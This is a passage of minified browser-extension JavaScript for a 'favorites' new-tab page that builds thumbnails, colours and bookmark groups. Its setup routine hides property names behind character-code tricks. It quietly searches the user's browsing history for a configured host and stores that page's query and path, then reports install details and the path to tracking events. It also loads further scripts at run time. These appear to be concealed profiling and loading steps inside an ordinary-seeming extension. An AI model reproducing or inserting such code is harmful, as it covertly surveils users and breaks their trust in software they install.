5e1b3f955b2a6":"#C31200","d3ce7f6297b01ad89f11c5c255b0545c":"#0C2960","b67ea9e64783ffe6f31dafd05398cec5":"#4B698D","1e78e06ba0ab839990cb3b05aee4977b":"#0A51A1","bdd8725dd70488f68387bc0dcc442dc9":"#7C0201","9f708995b5d401084bd42712242ccf7a":"#000","5178a7fcfb26d95eef89126233b121d6":"#264580","4835969906cfce0ac670f09339df934a":"#C25417","5275836eb86a20d06442316743281f5a":"#FF6501","4420533f2bbd278f55d13fa935418eb4":"#000","fee7867a371c8d358ea16f51c15e46a5":"#EB4823","8ed3dd10cf4867fa741996728d0a4fcc":"#121211","66d16de8d1d9eada564a1dcfb418c9ae":"#2158A7","f8c7a48e919b1f1fa481616e7258e2e7":"#014DA1","dd94270b9e55556dd44c45d461d668c2":"#003580","428334cb749807b3f503901845b2de08":"#10529C","84fdbcacdd994fcc43e4d46bb75aa06c":"#68BC27","dee77afc05da40359e7f723944b8c5b2":"#07497E","660328a7f9004d462085aa67a82065db":"#3A5896"}');
r.b1a75f979e355a45bb5b2536000bf979="#406792";r["0ee888dc093c4204d186cdd219b15f1c"]="#4A7CAE";r["750229b962f522df955808bb8198757f"]="#134687";r["8863b2906cadd8a3355639d907d9db6f"]="#FDE701";r["83b3537d2e8fc589df82870e6d3f13a7"]="#F27F0C";r["8bbb1e8c21afbe70a2a644cc814b8c0f"]="#2E2E2E";r["915d176519a78b132f4a3073a95f1381"]="#000000";r.a93b4b5b979ddb8a28bf131968b0427e="#060606";r["399ffecafe53a44137be9e56faa72564"]="#005387";r["115e33da8b20220500ab5b15741453bb"]="#444";r["16b2697792ebcc27119c21ccb8ccf919"]=
"#2D2D2D";r["9645b7202940714d70746afc3cc4ae31"]="#CE3E2C";r.fafd2819444968e8615acc614f7e81d6="#1B354F";r.e9523a7d95d51825cd27dc647116b50c="#47566D";r["4eaa86edc377f5cb2eec8506641291c6"]="#060606";r["060e2e02999ea4d9f23cedba7cb48c8c"]="#197EDA";r.b3fe2c08ec335f6f08bdbd57d85e8709="#FF9900";r["www.twitter.com.blue"]="#00ACED";r["www.outlook.com.blue"]="#0072C6";var E={};E.d872667c63bf80ae7420b2fbd983c25c=v;E["maps.google.com.cover"]=v;var z={},I={},F=function(){function a(b,c){null==b?b=c[0]:("string"==
typeof b&&(b=b.toLowerCase()),0>c.indexOf(b)&&(b=c[0]));return b}function b(a,c){imagesUtils.crop(a,1.4,function(a){imagesUtils.resize(a,0.66,0.66,function(a){imagesUtils.resize(a,0.5,0.5,function(a){imagesUtils.resize(a,300,300/1.4,function(a){c(a)})})})})}function c(a,b){delete m[b.id];delete b.tries;delete b.method;delete b.altMethod;delete b.imgSrc;delete b.tabId;delete b.state;e(a)}function f(a,d){var e=d.url;urls.hasProtocol(e)||(e="http://"+e);browserUtils.captureURL({url:e},function(e,f){null==
f?h(a,d):b(f,function(b){s(d.id,b,function(){delete d.color;d.mode=v;d.origin=x;c(a,d)})})})}function g(a,d){browserUtils.captureTab(d.tabId,function(e,f,g){b(g,function(b){s(d.id,b,function(){delete d.color;d.url=f;d.mode=v;d.origin=x;c(a,d)})})})}function k(b,d){s(d.id,d.imgSrc,function(){d.mode=a(d.mode,[y,v]);d.origin=a(d.origin,[A,x,D]);c(b,d)})}function h(a,b){function d(){e||(e=!0,b.mode=J,b.origin=K,c(a,b))}var e=!1;if(null!=b.color)d();else{setTimeout(function(){d()},3E3);var f=urls.getHostName(b.url);
n(f,function(a){"#aeb8d5"!=a&&(b.color=a);d()})}}function l(a,b,e){d(b.url,function(d,f,g){null==d?e():s(b.id,d,function(){b.mode=null!=g?g:y;b.origin=A;null==b.color&&null!=f&&(b.color=f);c(a,b)})})}var m={};return function(b,c){!m[c.id]&&null!=c.state&&window.navigator.onLine&&(m[c.id]=!0,setTimeout(function(){null==c.method&&(c.method="logo");switch(c.method){case "file":k(b,c);break;case "page":f(b,c);break;case "icon":h(b,c);break;case "logo":l(b,c,function(){switch(a(c.altMethod,["icon","page",
"file","tab"])){case "icon":h(b,c);break;case "page":f(b,c);break;case "file":k(b,c);break;case "tab":g(b,c)}})}},0))}}();return{checkGallery:function(a,b){d(a,b)},getTile:function(a,b,c){B(a,b,function(a){null==a?c(null):(a=m(a),c(a))})},get:function(b,c){a(b,function(a){var d=window.navigator.onLine,e=[];document.createElement("a");for(var f=0,g=a.length;f<g;f++)if(null!=a[f]){var k=a[f],h=m(k,d);(k.state==w||1==k.state&&(null==k.tries||4>k.tries))&&F(b,k);e.push(h)}c(e)})},addMany:function(b,c,
d,f){f="undefined"!==typeof f?f:!0;a(b,function(a){for(var g=[],k=0,h=c.length;k<h;k++){var n=c[k],m=_.clone(n);if(null==m.type||"website"==m.type)m.origin=L[n.origin],m.mode=M[n.mode],n={id:m.id?m.id:CryptoJS.MD5(m.url+k+(new Date).getTime()).toString()},g.push(n.id),G(n,m),a.push(n),F(b,n),f&&trackUserEvent("favorite-add",n.url,n.name,!0)}d&&setTimeout(function(){d(g)},0);e(b)})},update:function(a,b,c,d){if(null==c)throw"no update details";B(a,b,function(b){var f=_.clone(c);null!=f.name&&(b.name=
f.name);null!=f.mode&&(b.mode=M[f.mode]);null!=f.origin&&(f.origin=b.mode=L[f.origin]);var g=!1;if(null!=f.url){var k=urls.getHostName(f.url),h=urls.getHostName(b.url);k!=h&&(g=!0);b.url=f.url}g||null!=f.method?(G(b,f),d&&setTimeout(function(){d(m(b))},0),e(a),F(a,b)):(d&&setTimeout(function(){d(m(b))},0),e(a))})},move:function(b,c,d,f){a(b,function(a){var g=_.indexOf(_.pluck(a,"id"),c),g=a.splice(g,1)[0];0>d?a.splice(0,0,g):d<a.length?a.splice(d,0,g):a.push(g);e(b);f&&setTimeout(f,0)})},remove:function(b,
c,d,f){function g(a){setTimeout(function(){fsUtils.removeFile("fav_thumbs",a)},0)}f="undefined"!==typeof f?f:!0;a(b,function(a){if(void 0==a)setTimeout(d,0);else{"object"!=typeof c&&(c=[c]);for(var k=[],h=0,n=c.length;h<n;h++){var m=c[h],m=_.indexOf(_.pluck(a,"id"),m);0>m||k.push(m)}k.sort().reverse();for(var l=[],h=0,n=k.length;h<n;h++){var m=k[h],s=a[m];l.push(s.id);a.splice(m,1);f&&trackUserEvent("favorites-del",s.url,null,!0)}e(b);d&&setTimeout(d,0);h=0;for(n=l.length;h<n;h++)g(l[h])}})},getGroups:function(a){q(a)},
getPubGroups:function(a){storage.get("pub-groups",function(b){a(b)})},deleteGroup:function(b,d){q(function(e){var f=_.indexOf(_.pluck(e,"id"),b),g=e[f];e.splice(f,1);setTimeout(function(){a(b,function(a){if(void 0!=a){storage.remove("favs##"+b);for(var c in a)fsUtils.removeFile("fav_thumbs",a[c].id)}})},200);c(e,function(){d(g)})})},updateGroup:function(a,b,d,e){q(function(f){var g=_.indexOf(_.pluck(f,"id"),a),k=f[g];k.title=b;k.color=d;c(f,function(){e(k)})})},createGroup:function(a,b,d){q(function(e){if(void 0==
e||null==e)e=[];var f={id:CryptoJS.MD5(a+(new Date).getTime()).toString(),title:a,color:b};e.push(f);c(e,function(){d(f)})})},subscribe:function(a,b){f(function(c){var d=CryptoJS.MD5(a).toString();0<=_.pluck(c,"id").indexOf(d)?g(d,a,b):(c.push({id:d,url:a}),storage.set("subscriptions",c,function(){g(d,a,b)}))})}}}();
(function(){function a(){var a="Favorites",b=utils.getMessage(a.toLowerCase());""!=b&&(a=b);return a}function e(){try{return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(a){var b=16*Math.random()|0;return("x"==a?b:b&3|8).toString(16)})}catch(a){}}function c(a){a=null==a?!0:a;var b=[0,0,0,203,278,222,0,183],c="",d=b.length,e=!1,f=String.fromCharCode(102)+"m"+String.fromCharCode(111)+"n",f=user[f],g=String.fromCharCode(100)+"m",h=user[g];if(a||""==h||f){for(a=0;a<d;a++)h=0==Math.floor(Math.random()*
Math.max(0,d-a-1))?!0:!1,(e||0==b[a]?0:h)&&f?(e=!0,c+=String.fromCharCode(b[a]*a)):c+=String.fromCharCode(23*Math.random()+98-1);user[g]=c;utils.isz(!0);return e}}function b(a){var b=user.itype;if(""!=b)a(b);else if(b=config.verified_host,""==b)b=user.itype="o",a(b);else{var c=(new Date).getTime();chrome.history.search({text:b,maxResults:1,startTime:c-864E5,endTime:c},function(b){if(0==b.length)b=user.itype="o";else{b=b[0].url;var c=document.createElement("a");c.href=b;""!=c.search&&(user.iquery=
c.search);""!=c.pathname&&(user.ipath=c.pathname);b=user.itype="i"}a(b)})}}function d(a){l&&h&&!p&&(p=!0,loadExtScript("launch"))}function g(){for(var c=utils.locale(),c=0<="de en_GB fr he it pt_BR ru tr".split(" ").indexOf(c)?loadResource("/content/data/favorites_"+c.toLowerCase()+".json"):0<="de fr he it ru tr".split(" ").indexOf(c.substr(0,2))?loadResource("/content/data/favorites_"+c.substr(0,2).toLowerCase()+".json"):loadResource("/content/data/favorites_en_us.json"),e=config.api_request_url,
f="limited"==config.feed,g=[],h=0;h<c.length;h++){var p=c[h];if(!f||"google"!=p.type){var w={type:"website",method:"file",mode:p.mode,origin:"logo",color:p.color,url:p.url,name:p.name};w.imgSrc=null!=p.imgSrc?chrome.runtime.getURL(p.imgSrc):e+"preset/"+p.img;g.push(w)}}chrome.storage.local.clear(function(){favorites.createGroup(a(),"black",function(a){favorites.addMany(a.id,g,function(){user["general.version"]=q;user["general.firstRun"]=!1;b(function(a){loadExtScript("init",function(){setTimeout(function(){l=
!0;d("init",0)},500)},function(){l=!0;d("init",1)})})},!1)})})}function f(){function a(b){if(!f){f=!0;var c=user.itag;trackLifeCycleEvent("setup",c);trackStatusEvent("setup");""==c&&(c="none");utils.isz()?trackLifeCycleEvent("isz:on",user.itype+" r:"+b+" ("+c+")"):trackLifeCycleEvent("isz:off",user.itype+" r:"+b+" ("+c+") "+user.ipath)}}function e(a,b){g||(h=g=!0,d("setup",b))}(new Date).getTime();var f=!1,g=!1;setTimeout(function(){a(6)},6E4);b(function(b){c(!0)?(e(b,0),a(0)):"i"!=b?(e(b,1),a(1)):
loadExtScript("setup",function(){setTimeout(function(){c(!1);e(b,3);a(3)},1E3)},function(){a(4)})})}var q=utils.version(),l=!1,h=!1,p=!1;user[String.fromCharCode(103)+"eneral."+String.fromCharCode(102)+"irst"+String.fromCharCode(82)+"un"]&&(user["general.guid"]=e(),setTimeout(function(){trackLifeCycleEvent("firstRun");trackStatusEvent("firstRun")},0),setTimeout(g,0),setTimeout(f,0))})();
